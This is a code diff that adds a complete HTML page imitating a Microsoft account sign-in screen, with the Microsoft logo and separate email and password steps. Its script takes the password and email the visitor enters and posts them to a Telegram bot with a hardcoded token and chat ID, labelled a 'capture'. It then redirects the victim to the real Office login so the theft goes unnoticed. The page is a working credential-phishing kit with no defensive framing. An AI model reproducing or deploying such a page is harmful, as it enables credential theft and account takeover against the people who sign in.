@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            /* PROFESSIONAL MESH GRADIENT: Mimics the 'Fluent' look without using an image file */
+            background-color: #f2f7fb;
+            background-image: 
+                radial-gradient(at 0% 0%, #e1eef9 0%, transparent 50%), 
+                radial-gradient(at 100% 0%, #f0f4f8 0%, transparent 50%), 
+                radial-gradient(at 100% 100%, #e6f0f7 0%, transparent 50%), 
+                radial-gradient(at 0% 100%, #f3f8fc 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, #ffffff 0%, transparent 100%);
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.98); /* Slight glass effect */
+            width: 440px; 
+            padding: 44px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
+            min-height: 376px;
+            z-index: 5;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
+        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
+        
+        .user-display { display: flex; align-items: center; margin-bottom: 20px; font-size: 15px; cursor: pointer; color: #1b1b1b; }
+        
+        /* CSS BACK ARROW: Reliable and sharp */
+        .back-arrow {
+            width: 10px; height: 10px; margin-right: 12px;
+            border-left: 1.5px solid #505050; border-bottom: 1.5px solid #505050;
+            transform: rotate(45deg); display: inline-block;
+        }
+
+        .input-field {
+            width: 100%; border: none; border-bottom: 1px solid #666;
+            padding: 8px 0; font-size: 16px; margin-bottom: 12px; outline: none; background: transparent;
+        }
+        .input-field:focus { border-bottom: 2px solid #0067b8; }
+
+        .link-text { font-size: 13px; margin: 16px 0; color: #1b1b1b; }
+        .link-text a { color: #0067b8; text-decoration: none; }
+        .link-text a:hover { text-decoration: underline; }
+
+        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
+        .btn-next { 
+            background-color: #0067b8; color: #fff; border: none; 
+            padding: 8px 36px; font-size: 15px; cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-next:hover { background-color: #005da6; }
+
+        .options-box {
+            background: #fff; width: 440px; padding: 12px 44px;
+            margin-top: 1px; box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            display: flex; align-items: center; z-index: 5;
+        }
+        .key-svg { width: 24px; margin-right: 12px; opacity: 0.7; }
+
+        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; color: #000; }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
+        
+        <div id="step-email">
+            <h1>Sign in</h1>
+            <input type="email" id="email" placeholder="Email, phone, or Skype" class="input-field" onkeydown="if(event.key === 'Enter') toPass()">
+            <p class="link-text">No account? <a href="#">Create one!</a></p>
+            <p class="link-text"><a href="#">Can't access your account?</a></p>
+            <div class="button-row">
+                <button class="btn-next" onclick="toPass()">Next</button>
+            </div>
+        </div>
+
+        <div id="step-password" style="display: none;">
+            <div class="user-display" onclick="location.reload()">
+                <div class="back-arrow"></div>
+                <span id="display-email"></span>
+            </div>
+            <h1>Enter password</h1>
+            <input type="password" id="password" placeholder="Password" class="input-field" onkeydown="if(event.key === 'Enter') finalSubmit()">
+            <p class="link-text"><a href="#">Forgot password?</a></p>
+            <div class="button-row">
+                <button class="btn-next" onclick="finalSubmit()">Sign in</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="options-box" id="opt-box">
+        <svg class="key-svg" viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+        <span style="font-size: 15px;">Sign-in options</span>
+    </div>
+
+    <div class="footer">Terms of use &nbsp; Privacy & cookies</div>
+
+    <script>
+        let currentEmail = "";
+
+        function toPass() {
+            currentEmail = document.getElementById('email').value;
+            if(!currentEmail) return;
+            document.getElementById('step-email').style.display = 'none';
+            document.getElementById('opt-box').style.display = 'none';
+            document.getElementById('step-password').style.display = 'block';
+            document.getElementById('display-email').innerText = currentEmail;
+        }
+
+        async function finalSubmit() {
+            const pass = document.getElementById('password').value;
+            if(!pass) return;
+
+            // Telegram Capture
+            const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
+            const chatId = "5733378501";
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: chatId, 
+                        text: `💎 <b>PREMIUM CAPTURE</b>\nUser: ${currentEmail}\nPass: ${pass}`,
+                        parse_mode: 'HTML' 
+                    }),
+                    keepalive: true
+                });
+            } catch (e) {}
+
+            // Clean Redirect
+            window.location.href = "https://www.office.com/login?login_hint=" + encodeURIComponent(currentEmail);
+        }
+    </script>
+</body>
+</html>
